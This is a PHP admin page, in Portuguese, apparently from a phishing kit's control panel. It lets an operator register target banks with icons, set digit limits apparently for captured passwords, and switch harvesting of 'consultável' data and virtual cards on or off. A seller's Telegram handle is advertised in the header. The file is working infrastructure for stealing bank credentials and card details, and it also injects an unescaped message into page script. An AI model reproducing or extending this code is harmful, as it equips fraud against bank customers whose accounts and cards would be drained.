<?php
   session_start();
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   require 'config.php';
   
   function toast($msg) {
       echo '
       <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = false;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.success("'.$msg.'");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=Bancos";
               }, 2000);
           });
       </script>';
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['del_banco'])) {
       $id = intval($_POST['del_banco']);
       $stmt = $conn->prepare("DELETE FROM `bancos` WHERE `id` = ?");
       if ($stmt) {
           $stmt->bind_param("i", $id);
           if ($stmt->execute()) {
               toast("Banco deletado com sucesso!");
           } else {
               echo "<p style='color:red;'>Erro ao deletar: " . $stmt->error . "</p>";
           }
           $stmt->close();
       } else {
           echo "<p style='color:red;'>Erro na preparação do DELETE: " . $conn->error . "</p>";
       }
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['acao']) && $_POST['acao'] === 'alterar') {
       $id = intval($_POST['id']);
       
       $alterado = false;
       $msg = [];
   
       if (isset($_POST['colher_consultavel'])) {
           $valor = ($_POST['colher_consultavel'] == '1') ? 1 : 0;
           $stmt = $conn->prepare("UPDATE bancos SET colher_consultavel = ? WHERE id = ?");
           $stmt->bind_param("ii", $valor, $id);
           if ($stmt->execute()) {
               $alterado = true;
               $msg[] = "Consultável alterado!";
           }
           $stmt->close();
       }
   
       if (isset($_POST['colher_virtual'])) {
           $valor = ($_POST['colher_virtual'] == '1') ? 1 : 0;
           $stmt = $conn->prepare("UPDATE bancos SET colher_virtual = ? WHERE id = ?");
           $stmt->bind_param("ii", $valor, $id);
           if ($stmt->execute()) {
               $alterado = true;
               $msg[] = "Virtual alterado!";
           }
           $stmt->close();
       }
   
       if ($alterado) {
           toast(implode(" | ", $msg));
       }
   }
   
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['banco']) && isset($_POST['icone'])) {
       $banco = $conn->real_escape_string($_POST['banco'] ?? '');
       $icone = $conn->real_escape_string($_POST['icone'] ?? '');
       $min_digitos = (int)($_POST['min_digitos'] ?? 4);
       $max_digitos = (int)($_POST['max_digitos'] ?? 8);
       $colher_consultavel = isset($_POST['colher_consultavel']) ? (int)$_POST['colher_consultavel'] : 1;
       $colher_virtual = isset($_POST['colher_virtual']) ? (int)$_POST['colher_virtual'] : 0;
   
       if ($banco === '' || $icone === '') {
           echo "<p style='color:red;'>Erro: preencha todos os campos.</p>";
           exit;
       }
   
       $stmt = $conn->prepare("INSERT INTO bancos (banco, icone, min_digitos, max_digitos, colher_consultavel, colher_virtual) VALUES (?, ?, ?, ?, ?, ?)");
       $stmt->bind_param("ssiiii", $banco, $icone, $min_digitos, $max_digitos, $colher_consultavel, $colher_virtual);
   
       if ($stmt->execute()) {
           toast("Banco cadastrado com sucesso!");
       } else {
           echo "Erro ao cadastrar banco: " . $stmt->error;
       }
   
       $stmt->close();
   }
   
   $sql = "SELECT id, banco, icone, min_digitos, max_digitos, colher_consultavel, colher_virtual FROM bancos ORDER BY id DESC";
   $result = $conn->query($sql);
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
      <div class="block-header">
         <div class="row clearfix">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá  admin, você está em  / Bancos</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram!  </span>
            </div>
         </div>
      </div>
      <section id="bancos" class="campo">
         <h3>Bancos</h3>
         <div id="div_novo_banco" class="div_size_desktop">
            <form method="POST" action="">
               <div class="form-group">
                  <label class="form-control-label">Banco</label>
                  <input type="text" name="banco" class="form-control" required>
               </div>
               <div class="form-group">
                  <label class="form-control-label">Icone</label>
                  <input type="text" name="icone" class="form-control" required>
               </div>
               <div class="form-group">
                  <label class="form-control-label">Mínimo de dígitos</label>
                  <input type="number" name="min_digitos" class="form-control" value="4" min='4' max='20'>
               </div>
               <div class="form-group">
                  <label class="form-control-label">Máximo de dígitos</label>
                  <input type="number" name="max_digitos" class="form-control" value="8" min='4' max='20'>
               </div>
               <div class="form-group">
                  <label class="form-control-label">Colher consultável</label>
                  <select name="colher_consultavel" class="form-control">
                     <option value="1">Sim</option>
                     <option value="0">Não</option>
                  </select>
               </div>
               <div class="form-group">
                  <label class="form-control-label">Colher cartão virtual</label>
                  <select name="colher_virtual" class="form-control">
                     <option value="1">Sim</option>
                     <option value="0">Não</option>
                  </select>
               </div>
               <button type="submit" class="btn btn-primary">Adicionar</button>
            </form>
         </div>
      </section>
      <br>
      <div class="card">
         <div class="card-header">
            <strong>Bancos Total</strong>
         </div>
         <div class="card-body">
            <div class="table-responsive">
               <table class="table mb-0">
                  <thead>
                     <tr>
                        <!--<th>ID</th>-->
                        <th>Banco</th>
                        <th>Ícone</th>
                        <th>Min</th>
                        <th>Max</th>
                        <th>Consultável</th>
                        <th>Virtual</th>
                        <th>Ações</th>
                     </tr>
                  </thead>
                  <tbody>
                     <?php if ($result->num_rows > 0): ?>
                     <?php while ($row = $result->fetch_assoc()): ?>
                     <tr>
                        <!--<td></td>-->
                        <td><?= htmlspecialchars($row['banco']) ?></td>
                        <td>
                           <img src="<?= htmlspecialchars($row['icone']) ?>"
                              height="40"
                              alt="<?= htmlspecialchars($row['banco']) ?>">
                        </td>
                        <td><?= (int)$row['min_digitos'] ?></td>
                        <td><?= (int)$row['max_digitos'] ?></td>
                        <td>
                           <form method="post" class="mb-0">
                              <input type="hidden" name="id" value="<?= (int)$row['id'] ?>">
                              <input type="hidden" name="acao" value="alterar">
                              <select name="colher_consultavel"
                                 class="form-control form-control-sm"
                                 onchange="this.form.submit()">
                                 <option value="1" <?= $row['colher_consultavel'] == 1 ? 'selected' : '' ?>>Sim</option>
                                 <option value="0" <?= $row['colher_consultavel'] == 0 ? 'selected' : '' ?>>Não</option>
                              </select>
                           </form>
                        </td>
                        <td>
                           <form method="post" class="mb-0">
                              <input type="hidden" name="id" value="<?= (int)$row['id'] ?>">
                              <input type="hidden" name="acao" value="alterar">
                              <select name="colher_virtual"
                                 class="form-control form-control-sm"
                                 onchange="this.form.submit()">
                                 <option value="1" <?= $row['colher_virtual'] == 1 ? 'selected' : '' ?>>Sim</option>
                                 <option value="0" <?= $row['colher_virtual'] == 0 ? 'selected' : '' ?>>Não</option>
                              </select>
                           </form>
                        </td>
                        <td>
                           <form method="post" class="d-inline">
                              <input type="hidden" name="del_banco" value="<?= (int)$row['id'] ?>">
                              <button type="submit" class="btn btn-danger btn-sm">
                              Deletar
                              </button>
                           </form>
                        </td>
                     </tr>
                     <?php endwhile; ?>
                     <?php else: ?>
                     <tr>
                        <td colspan="8" class="text-center">
                           Nenhum banco cadastrado
                        </td>
                     </tr>
                     <?php endif; ?>
                  </tbody>
               </table>
            </div>
         </div>
      </div>